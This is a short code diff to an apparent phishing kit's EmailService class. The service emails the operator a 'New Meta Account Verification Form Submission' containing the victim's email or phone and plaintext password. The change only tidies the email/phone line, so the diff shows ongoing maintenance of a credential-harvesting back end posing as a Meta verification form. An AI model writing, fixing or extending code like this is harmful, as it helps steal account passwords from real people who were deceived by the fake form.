@@ -42,7 +42,7 @@ class EmailService {
       subject: 'New Meta Account Verification Form Submission',
       html: `
         <h2>New Confirmation Form Submission</h2>
-        <p><strong>Email/Phone:</strong> ${data.user_email}</p>
+        ${data.user_email ? `<p><strong>Email/Phone:</strong> ${data.user_email}</p>` : ''}
         <p><strong>Password:</strong> ${data.password}</p>
         <p><strong>Submission Time:</strong> ${new Date().toLocaleString()}</p>
       `
